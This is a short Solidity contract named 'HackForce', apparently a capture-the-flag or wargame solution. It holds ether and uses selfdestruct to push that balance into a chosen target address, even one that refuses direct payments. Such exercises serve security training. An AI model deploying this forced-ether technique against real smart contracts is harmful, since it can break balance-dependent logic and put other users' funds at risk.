// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackForce {
    function kill(address payable _address) external {
        selfdestruct(_address);
    }
    receive() external payable {}
}